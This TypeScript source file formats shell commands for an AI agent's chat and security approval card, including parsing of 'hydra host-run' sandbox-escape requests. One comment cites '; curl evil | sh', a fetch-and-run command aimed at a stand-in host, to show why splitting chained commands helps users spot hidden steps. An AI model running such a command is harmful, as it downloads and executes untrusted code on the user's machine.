// splitBashChains inserts a newline after each top-level `;`, `&&` and `||` so a
// chained one-liner reads as separate steps. It is deliberately optimistic: it
// only tracks quotes and backslash escapes, not the full shell grammar, and a
// command that already contains newlines is left exactly as written.
//
// It is DISPLAY-ONLY and insert-only: it never removes, reorders, or rewrites a
// character, so every byte of the original command is still shown in the same
// order (just with extra line breaks). That property is what makes it safe to use
// on the security approval card - the text a user approves is byte-for-byte the
// command that runs; splitting merely makes a buried `; curl evil | sh` easier to
// spot, never harder.
export function splitBashChains(cmd: string): string {
  if (cmd.includes('\n')) return cmd
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    out += ch
    if (escaped) {
      escaped = false
      continue
    }
    if (ch === '\\') {
      escaped = true
      continue
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle
      continue
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble
      continue
    }
    if (inSingle || inDouble) continue
    // `;` splits (but not `;;`, a case terminator); `&&`/`||` split after the
    // second character. A single `|` (pipe) or `&` (background/redirect) does
    // not.
    const isChain = (ch === ';' && cmd[i + 1] !== ';') || ((ch === '&' || ch === '|') && cmd[i + 1] === ch)
    if (!isChain) continue
    if (ch !== ';') out += cmd[++i]
    while (cmd[i + 1] === ' ') i++
    // Keep the conventional error-suppression suffixes attached to the command
    // they qualify. Splitting `command -v bun || true` (or `... || :`) leaves a
    // visually orphaned no-op on its own line and makes the script harder, not
    // easier, to scan. Other control chains still split normally.
    const rest = cmd.slice(i + 1).trim()
    const trivialFallback = ch === '|' && /^(?:true|:)\s*$/.test(rest)
    if (i + 1 < cmd.length) out += trivialFallback ? ' ' : '\n'
  }
  return out
}

// Codex reports shell commands as the argv-style launcher it executed, commonly
// `/usr/bin/bash -lc '<script>'`. The wrapper is implementation detail, so show
// the script itself while retaining the untouched item behind the tool card's
// Raw toggle. App-server also reports the equivalent `-c` form and, depending
// on platform/launch path, spells the executable as bash, /bin/bash, or
// /usr/bin/bash. Unquoted remainders are accepted because this is a display
// formatter for the provider's command string, not an argv parser.
function parseOneShellWord(source: string): string | null {
  let out = ''
  let quote: "'" | '"' | null = null
  let escaped = false
  let started = false
  for (let i = 0; i < source.length; i++) {
    const ch = source[i]
    if (escaped) {
      out += ch
      escaped = false
      started = true
      continue
    }
    if (quote === "'") {
      if (ch === "'") quote = null
      else out += ch
      started = true
      continue
    }
    if (quote === '"') {
      if (ch === '"') quote = null
      else if (ch === '\\' && /[\\"$`\n]/.test(source[i + 1] ?? '')) escaped = true
      else out += ch
      started = true
      continue
    }
    if (ch === "'" || ch === '"') {
      quote = ch
      started = true
    } else if (ch === '\\') {
      escaped = true
      started = true
    } else if (/\s/.test(ch)) {
      if (started && source.slice(i).trim()) return null
    } else {
      out += ch
      started = true
    }
  }
  return quote || escaped || !started ? null : out
}

function unwrapOneBashCommand(command: string): string {
  const match = command.match(/^(?:\/usr\/bin\/|\/bin\/)?bash\s+-(?:l)?c\s+([\s\S]+)$/)
  if (!match) return command
  const arg = match[1].trim()
  if (!arg) return command
  return parseOneShellWord(arg) ?? arg
}

export function unwrapBashLoginCommand(command: string): string {
  let current = command
  for (let depth = 0; depth < 3; depth++) {
    const next = unwrapOneBashCommand(current)
    if (next === current) break
    current = next
  }
  return current
}

// stripLineContinuations drops the trailing `\` from a `\`-newline pair so a
// multi-line script reads as plain lines instead of carrying the escape noise.
// The line break itself is kept (bash would join the lines, but the author wrote
// them apart deliberately), and leading/trailing blank lines - e.g. the lone `\`
// some agents emit before the first real line - are removed.
//
// Quote-aware: inside single quotes a backslash is literal, so `\`-newline there
// is left alone. Unlike splitBashChains this DOES remove characters, so it is for
// the chat transcript only, never the approval card.
export function stripLineContinuations(cmd: string): string {
  if (!cmd.includes('\n')) return cmd
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (escaped) {
      out += ch
      escaped = false
      continue
    }
    if (ch === '\\' && !inSingle) {
      if (cmd[i + 1] === '\n') {
        // Also drop the space that separated the backslash from the command, so
        // the line does not end in trailing whitespace.
        out = out.replace(/[ \t]+$/, '')
        continue
      }
      escaped = true
      out += ch
      continue
    }
    if (ch === "'" && !inDouble) inSingle = !inSingle
    else if (ch === '"' && !inSingle) inDouble = !inDouble
    out += ch
  }
  return out.replace(/^\s*\n/, '').trimEnd()
}

// dropRedundantSemicolons removes a `;` that sits immediately before a newline
// (allowing trailing spaces) or at the very end of the script - once a chain has
// been split onto separate lines, `cmd;` + newline is exactly `cmd` + newline in
// bash, so the `;` is pure noise. Quote-aware, and it never touches a `;;` case
// terminator. Display-only (chat, not the approval card) since it removes
// characters.
export function dropRedundantSemicolons(cmd: string): string {
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (escaped) {
      out += ch
      escaped = false
      continue
    }
    if (ch === '\\' && !inSingle) {
      escaped = true
      out += ch
      continue
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle
      out += ch
      continue
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble
      out += ch
      continue
    }
    // Skip a lone `;` (not part of `;;`) when only whitespace remains before the
    // next newline or the end of the script; drop that trailing whitespace too.
    if (ch === ';' && !inSingle && !inDouble && cmd[i - 1] !== ';' && cmd[i + 1] !== ';') {
      let j = i + 1
      while (cmd[j] === ' ' || cmd[j] === '\t') j++
      if (j >= cmd.length || cmd[j] === '\n') {
        i = j - 1
        continue
      }
    }
    out += ch
  }
  return out
}

// HOST_RUN matches the sandbox escape hatch an agent runs to ask for a command
// on the host - `hydra host-run -- <command>`, however the binary is spelled
// (`/tmp/hydra-internal`, a worktree-local `./hydra`, a bare `hydra`).
const HOST_RUN = /^\s*(?:[\w./-]*\/)?hydra(?:-internal)?\s+host-run\s+(?:--\s+)?([\s\S]+)$/

// hostRunArgv trims `rest` to the part the SANDBOX shell actually hands to
// host-run as argv: everything up to the first unquoted control operator
// (`|`, `||`, `&&`, `;`, `&`, newline) or redirection (`2>&1`, `> log`), which
// the shell consumes itself and never passes on.
//
// Without this the chat card read `host-run --help 2>&1 | head -20` as a host
// command of `--help 2>&1 | head -20` while the approval card - built from the
// CLI's real argv - said `--help`. The card was right: the pipe runs INSIDE the
// sandbox, against host-run's own output. Two surfaces disagreeing about what
// will run on the host is the one thing this feature cannot afford.
function hostRunArgv(rest: string): string {
  let quote: "'" | '"' | null = null
  let escaped = false
  let tokenStart = 0
  for (let i = 0; i < rest.length; i++) {
    const ch = rest[i]
    if (escaped) {
      escaped = false
      continue
    }
    if (ch === '\\') {
      escaped = true
      continue
    }
    if (quote) {
      if (ch === quote) quote = null
      continue
    }
    if (ch === "'" || ch === '"') {
      quote = ch
      continue
    }
    if (/\s/.test(ch)) {
      tokenStart = i + 1
      continue
    }
    // A control operator ends the invocation; everything after is the sandbox's.
    if (ch === '|' || ch === '&' || ch === ';' || ch === '\n') return rest.slice(0, i)
    // A redirection takes its whole token with it - `2>&1` starts at the `2`, so
    // cut back to where the current word began rather than at the `>`.
    if (ch === '<' || ch === '>') return rest.slice(0, tokenStart)
  }
  return rest
}

// parseHostRunScript returns the command a `hydra host-run` invocation is asking
// the user to run on the host, or null when the command isn't a host-run at all.
// Shell syntax the sandbox consumes is dropped (see hostRunArgv), the
// `bash -c '<script>'` wrapper agents habitually add is unwrapped, and a whole
// script passed as one quoted argument is unquoted - all three mirror what the
// CLI does when it renders the request, so the chat shows the same text the
// approval card asks about.
export function parseHostRunScript(command: string): string | null {
  const match = command.match(HOST_RUN)
  if (!match) return null
  const rest = stripHostRunFlags(hostRunArgv(match[1]).trim())
  if (!rest) return null
  const unwrapped = unwrapBashLoginCommand(rest)
  if (unwrapped !== rest) return unwrapped
  return parseOneShellWord(rest) ?? rest
}

// HOST_RUN_WHY matches the leading `--why`/`--description` option (in either the
// `--why <text>` or `--why=<text>` form) and the `--` separator that may follow
// it. The explanation is the agent's prose, shown in its own right by the
// approval card - it is not part of the command, so it never belongs in the box
// labelled "command to run on the host". Mirrors takeWhyFlag in internal/cli.
const HOST_RUN_WHY = /^(?:--(?:why|description)(?:=(?:'[^']*'|"[^"]*"|\S*)|\s+(?:'[^']*'|"[^"]*"|\S+))\s*)+(?:--\s+)?/

function stripHostRunFlags(rest: string): string {
  return rest.replace(HOST_RUN_WHY, '').trim()
}

// dropNoopCd removes a leading `cd .` (or `cd ./`, quoted or not) together with
// the `&&` / `;` / newline that chains it to the real command. Changing to `.`
// is a no-op, so the prefix is pure noise - and worse, it makes the script look
// like it already has a `cd`, which suppresses the real working-directory
// preamble below. A command that is *only* `cd .` is left as written; there
// would be nothing left to show. Display-only (chat, not the approval card)
// since it removes characters.
export function dropNoopCd(cmd: string): string {
  let out = cmd
  for (;;) {
    const next = out.replace(/^[ \t]*cd[ \t]+(['"]?)\.\/?\1[ \t]*(?:&&|;|\n)[ \t\n]*/, '')
    if (next === out || !next.trim()) return out
    out = next
  }
}

function quoteShellPath(path: string): string {
  return /^[A-Za-z0-9_./-]+$/.test(path) ? path : `'${path.replace(/'/g, `'"'"'`)}'`
}

export function formatBashForDisplay(command: string, cwd?: string): string {
  const script = dropRedundantSemicolons(splitBashChains(dropNoopCd(stripLineContinuations(unwrapBashLoginCommand(command)))))
  if (!cwd || cwd === '.' || /^\s*cd(?:\s|$)/.test(script)) return script
  return `cd ${quoteShellPath(cwd)}\n${script}`
}
